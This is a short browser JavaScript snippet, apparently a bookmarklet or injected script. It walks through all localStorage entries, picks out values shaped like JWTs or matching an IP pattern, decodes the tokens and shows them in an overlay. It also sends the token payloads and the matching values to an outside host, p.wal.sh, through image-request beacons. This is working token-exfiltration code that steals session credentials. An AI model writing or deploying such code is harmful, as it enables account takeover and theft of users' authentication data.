(() => {
  const JWT_REGEX = /^[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+?\.([a-zA-Z0-9\-_]+)?$/;

  const TRACKER_REGEX = /38.142.82.50/;

  const createImage = src => {
    let img = document.createElement('img');
    img.src = src;
    document.body.appendChild(img);
  };

  const createOverlay = text => {
    let overlay = document.createElement('pre');
    overlay.style.width = '400px';
    overlay.style.width = '400px';
    overlay.style.position = 'absolute';
    overlay.style.top = 0;
    overlay.style.right = 100;
    overlay.style.zIndex = 99;
    overlay.style.backgroundColor = '#fff';
    overlay.style.border = '1px solid #69c';
    overlay.innerHTML = text;
    document.body.appendChild(overlay);
  };

  const parseJwt = token => {
    const base64Url = token.split('.')[1];
    const base64 = base64Url.replace('-', '+').replace('_', '/');
    return JSON.parse(window.atob(base64));
  };

  Object.keys(localStorage)
    .forEach(e => {
      const v = localStorage.getItem(e);
      if (TRACKER_REGEX.test(v)) {
        createImage('http://p.wal.sh/i.php?' + v);
      }
      if (JWT_REGEX.test(v)) {
        const token = v;
        console.log(e, token);
        createImage('http://p.wal.sh/i.php?' + JSON.stringify(parseJwt(token)));
        createOverlay(JSON.stringify(parseJwt(token), null, '  '));
      }
    });
})();
